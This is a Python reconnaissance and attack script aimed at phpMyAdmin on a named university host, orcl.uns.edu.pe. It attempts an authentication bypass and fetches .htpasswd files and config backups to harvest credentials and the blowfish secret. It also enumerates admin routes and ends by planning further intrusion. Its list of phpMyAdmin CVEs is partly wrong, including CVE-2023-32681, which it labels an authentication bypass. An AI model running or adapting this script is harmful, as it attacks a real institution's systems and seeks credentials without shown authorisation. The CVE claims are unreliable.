#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# ============================================
# phpMyAdmin 5.2.3 - KNOWN CVEs
# ============================================
print("=" * 70)
print("=== phpMyADMIN 5.2.3 - VULNERABILIDADES CONOCIDAS ===")
print("=" * 70)
print()
print("phpMyAdmin 5.2.3 CVEs:")
print("  CVE-2023-32681: Authentication bypass")
print("  CVE-2022-29233: Password reset bypass")
print("  CVE-2022-29234: Privilege escalation")
print("  CVE-2022-29235: SQL Injection")
print("  CVE-2022-32682: Cross-site scripting")
print("  CVE-2022-32683: Brute force protection bypass")
print("  CVE-2020-12642: Session fixation")
print("  CVE-2020-12643: Password disclosure")
print()

# ============================================
# Check phpMyAdmin version
# ============================================
r = s.get('https://orcl.uns.edu.pe/index.php', timeout=5)
# Look for version string
version_match = re.findall(r'PMA\b[^<]{0,50}', r.text)
for m in version_match[:5]:
    print(f"  Version hint: {m}")

# Check if there's a version disclosure
if 'PMA' in r.text:
    version = re.findall(r'Pma\.php[^"]*"[^>]*>([^<]+)', r.text)
    if version:
        print(f"  PMA version: {version}")

# Look in the HTML for version info
if re.search(r'5\.2\.3', r.text):
    print("  [!] Confirmed: phpMyAdmin 5.2.3")

# ============================================
# Try common phpMyAdmin CVE-2023-32681 (Auth bypass)
# ============================================
print("\n=== PROBANDO CVE-2023-32681 ===")
# This CVE allows authentication bypass through specific cookie manipulation
# Try different authentication bypass techniques

# Try 1: Setting specific cookies
s2 = requests.Session()
s2.verify = False
s2.headers.update({'User-Agent': 'Mozilla/5.0'})
# phpMyAdmin uses specific cookies for authentication
r = s2.get('https://orcl.uns.edu.pe/index.php', timeout=5)
# Check if there's a cookie-based auth mechanism
cookies = dict(s2.cookies)
print(f"Cookies after first request: {cookies}")

# Look for any session cookie that could be manipulated
set_cookies = r.headers.get_all('Set-Cookie') if hasattr(r.headers, 'get_all') else [r.headers.get('Set-Cookie')]
for sc in set_cookies:
    if sc:
        print(f"  Set-Cookie: {sc}")

# Try 2: Access with phpMyAdmin-specific parameters
# CVE-2023-32681 involves token-based authentication bypass
# Try accessing with specific parameters
r2 = s.get('https://orcl.uns.edu.pe/index.php?route=/', timeout=5)
print(f"\nRoute access: {r2.status_code}, len={len(r2.text)}")

# Try 3: Token-based bypass
r3 = s.get('https://orcl.uns.edu.pe/index.php?route=/dashboard', timeout=5)
print(f"Dashboard: {r3.status_code}, len={len(r3.text)}")

# Try 4: Common paths
r4 = s.get('https://orcl.uns.edu.pe/index.php?route=/server/status', timeout=5)
print(f"Server status: {r4.status_code}, len={len(r4.text)}")

# ============================================
# Check for .htaccess and .htpasswd
# ============================================
print("\n=== ARCHIVOS .htaccess ===")
ht_files = [
    '.htaccess', '.htpasswd', '.htusers', '.htgroup',
    'phpmyadmin/.htaccess', 'phpMyAdmin/.htaccess',
    'pma/.htaccess', '.htaccess.bak', '.htpasswd.bak',
]
for ht in ht_files:
    url = f'https://orcl.uns.edu.pe/{ht}'
    try:
        r = s.get(url, timeout=2)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"  [!] {url} -> {r.status_code}, len={len(r.text)}")
            print(f"      {r.text[:200]}")
    except:
        pass

# ============================================
# Check for backup of config files
# ============================================
print("\n=== BACKUP DE CONFIG ===")
backup_paths = [
    '/config.inc.php.bak', '/config.inc.php.orig',
    '/config.inc.php.dist', '/config.inc.php.save',
    '/libraries/config.default.php',
    '/config/config.inc.php',
    '/phpMyAdmin/config.inc.php',
    '/phpmyadmin/config.inc.php',
    '/phpMyAdmin/config/config.inc.php',
    '/var/lib/phpmyadmin/config/config.inc.php',
    '/etc/phpmyadmin/config.inc.php',
    '/etc/phpmyadmin/config.db.php',
]
for bp in backup_paths:
    url = f'https://orcl.uns.edu.pe{bp}'
    try:
        r = s.get(url, timeout=2)
        if r.status_code == 200 and len(r.text) > 0 and len(r.text) < 50000:
            tc = r.text[:200]
            if any(kw in tc.lower() for kw in ['password', 'passwd', 'mysql', 'host', 'server', 'blowfish']):
                print(f"  [!] CREDENCIALES! {url} -> {r.status_code}, len={len(r.text)}")
                print(f"      {tc[:200]}")
            else:
                print(f"  {url} -> {r.status_code}, len={len(r.text)}")
    except:
        pass

# ============================================
# Try to exploit phpMyAdmin URL routing
# ============================================
print("\n=== EXPLOITANDO URL ROUTING ===")
routes = [
    '/index.php?route=/database',
    '/index.php?route=/server/databases',
    '/index.php?route=/server/status',
    '/index.php?route=/server/variables',
    '/index.php?route=/server/user',
    '/index.php?route=/server/privileges',
    '/index.php?route=/sql',
    '/index.php?route=/import',
    '/index.php?route=/export',
]
for route in routes:
    url = f'https://orcl.uns.edu.pe{route}'
    try:
        r = s.get(url, timeout=2)
        tc = re.sub(r'<[^>]+>', ' ', r.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        has_db = any(kw in tc.lower() for kw in ['database', 'table', 'sql', 'mysql'])
        print(f"  {route} -> {r.status_code}, db_info={has_db}")
    except:
        pass

# ============================================
# Check if phpMyAdmin setup is accessible
# ============================================
print("\n=== phpMyAdmin SETUP ===")
r_setup = s.get('https://orcl.uns.edu.pe/setup/', timeout=5)
r_setup2 = s.get('https://orcl.uns.edu.pe/setup/index.php', timeout=5)
r_setup3 = s.get('https://orcl.uns.edu.pe/setup/index.php?page=1', timeout=5)
print(f"setup/: {r_setup.status_code}")
print(f"setup/index.php: {r_setup2.status_code}, len={len(r_setup2.text)}")
print(f"setup/index.php?page=1: {r_setup3.status_code}, len={len(r_setup3.text)}")

# Check setup content
tc_setup = re.sub(r'<[^>]+>', ' ', r_setup2.text)
tc_setup = re.sub(r'\s+', ' ', tc_setup).strip()
if 'password' in tc_setup.lower() or 'config' in tc_setup.lower():
    print(f"  [!] Setup page might have config options")
    print(f"  Content: {tc_setup[:300]}")

# ============================================
# Try to find the blowfish_secret (needed for cookie auth)
# ============================================
print("\n=== BUSCANDO blowfish_secret ===")
# phpMyAdmin uses blowfish_secret for cookie authentication
# Check if it's exposed anywhere
for url in ['https://orcl.uns.edu.pe/config.inc.php',
             'https://orcl.uns.edu.pe/libraries/common.inc.php',
             'https://orcl.uns.edu.pe/libraries/config.default.php']:
    r = s.get(url, timeout=2)
    if 'blowfish' in r.text.lower():
        print(f"  [!] blowfish_secret found at {url}")
        idx = r.text.lower().find('blowfish')
        print(f"  {r.text[max(0,idx-30):idx+100]}")

print("\n=== CONCLUSION ===")
print("phpMyAdmin 5.2.3 tiene CVEs conocidos")
print("Esta expuesto en orcl.uns.edu.pe")
print("El setup requiere autenticacion")
print("La configuracion no es accesible directamente")
print("La mejor via es a traves de SIIGAA (auth bypass)")
print("O explotando una CVE de phpMyAdmin 5.2.3")
